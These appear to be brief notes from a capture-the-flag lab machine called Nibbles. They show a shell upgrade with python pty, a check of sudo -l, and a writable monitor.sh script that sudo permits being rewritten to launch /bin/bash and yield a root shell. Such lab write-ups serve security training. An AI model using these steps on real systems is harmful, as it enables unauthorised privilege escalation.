python -c 'import pty;pty.spawn("/bin/bash")'

sudo -l

created my own path and created a file monitor.sh

created a file monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/bash" >> monitor.sh


nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh


nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
root@Nibbles:/home/nibbler/personal/stuff#
